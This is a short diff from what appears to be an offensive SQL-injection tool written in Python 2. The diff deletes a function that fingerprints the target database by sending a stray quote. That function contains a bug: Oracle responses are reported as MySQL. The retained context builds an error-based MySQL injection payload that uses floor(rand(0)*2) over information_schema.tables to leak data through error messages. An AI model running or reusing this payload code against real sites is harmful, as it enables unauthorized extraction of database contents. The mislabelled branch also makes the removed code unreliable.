@@ -44,29 +44,6 @@ def httpreq(request_param):
     return response
 
 
-def check_dbms():
-    ck_dbms = httpreq("'")
-
-    if ck_dbms.find('MySQL') != -1:
-        cn_dbms = 'MYSQL'
-        print "[Info] It's database looks like '" + cn_dbms + "'"
-        return cn_dbms
-
-    elif ck_dbms.find('mssql') != -1:
-        cn_dbms = 'MSSQL'
-        print "[Info] It's database looks like '" + cn_dbms + "'"
-        return cn_dbms
-
-    elif ck_dbms.find('ORA') != -1:
-        cn_dbms = 'MySQL'
-        print "[Info] It's database looks like '" + cn_dbms + "'"
-        return cn_dbms
-
-    else:
-        print "[Info] Couldn't Assume database"
-        return -1
-
-
 def error_httpreq(vuln_part):
     vuln_param = "=(select a from (select count(*),concat('" + delims + "'," + vuln_part + ",'" + delims + "',floor(rand(0)*2))a from information_schema.tables group by a)b)%23"
     params = tmp_params + plus_white(vuln_param)
